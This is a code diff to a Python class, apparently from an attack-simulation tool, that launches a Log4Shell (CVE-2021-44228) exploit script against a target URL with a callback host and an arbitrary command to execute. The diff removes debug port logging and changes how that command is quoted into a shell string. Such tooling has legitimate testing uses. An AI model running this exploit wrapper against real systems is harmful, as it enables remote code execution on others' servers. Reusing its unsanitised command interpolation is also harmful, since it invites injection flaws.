@@ -354,7 +354,7 @@ class Trainman:
             output = {'outcome': 'failed', 'message': 'Missing ldap_port', 'forward_log': 'False'}
             return output
         if 'exec_cmd' in self.args:
-            exec_cmd = self.args['exec_cmd'].strip('"')
+            exec_cmd = self.args['exec_cmd']
         else:
             output = {'outcome': 'failed', 'message': 'Missing exec_cmd', 'forward_log': 'False'}
             return output
@@ -411,13 +411,8 @@ class Trainman:
         #        'forward_log': 'False'
         #    }
         #    return output
-        debug = {'first_psutil': [], 'second_psutil': [], 'third_psutil': []}
-        first_psutil = psutil.net_connections()
-        for conn in first_psutil:
-            if conn.status == 'LISTEN':
-                debug['first_psutil'].append(conn.laddr.port)
         exploit_cve_2021_44228_cmd = \
-            f'python3 main.py -i {self.host_info[2]} -e {callback} -u {target_url} -c {exec_cmd} -p {http_port} ' \
+            f'python3 main.py -i {self.host_info[2]} -e {callback} -u {target_url} -c "{exec_cmd}" -p {http_port} ' \
             f'-l {ldap_port}'
         exploit_cve_2021_44228 = subprocess.Popen(
             exploit_cve_2021_44228_cmd,
@@ -429,19 +424,11 @@ class Trainman:
             cwd=r'/L4sh',
             preexec_fn=os.setsid
         )
-        second_psutil = psutil.net_connections()
-        for conn in second_psutil:
-            if conn.status == 'LISTEN':
-                debug['second_psutil'].append(conn.laddr.port)
         try:
             exploit_cve_2021_44228_output, exploit_cve_2021_44228_error = exploit_cve_2021_44228.communicate(timeout=30)
         except:
             os.killpg(os.getpgid(exploit_cve_2021_44228.pid), signal.SIGTERM)
             exploit_cve_2021_44228_output, exploit_cve_2021_44228_error = exploit_cve_2021_44228.communicate()
-        third_psutil = psutil.net_connections()
-        for conn in third_psutil:
-            if conn.status == 'LISTEN':
-                debug['third_psutil'].append(conn.laddr.port)
         if exploit_cve_2021_44228_output:
             if 'New HTTP Request 200' in exploit_cve_2021_44228_output.decode():
                 output = {
@@ -464,8 +451,7 @@ class Trainman:
                 'outcome': 'failed',
                 'message': 'exploit_cve_2021_44228 execution failed. '
                             f'exploit stdout: {exploit_cve_2021_44228_output.decode()}, '
-                            f'exploit stderr: {exploit_cve_2021_44228_error.decode()}, '
-                            f'debug_ip: {self.host_info[2]}, debug_ports: {debug}',
+                            f'exploit stderr: {exploit_cve_2021_44228_error.decode()}',
                 'forward_log': 'True'
             }
         return output
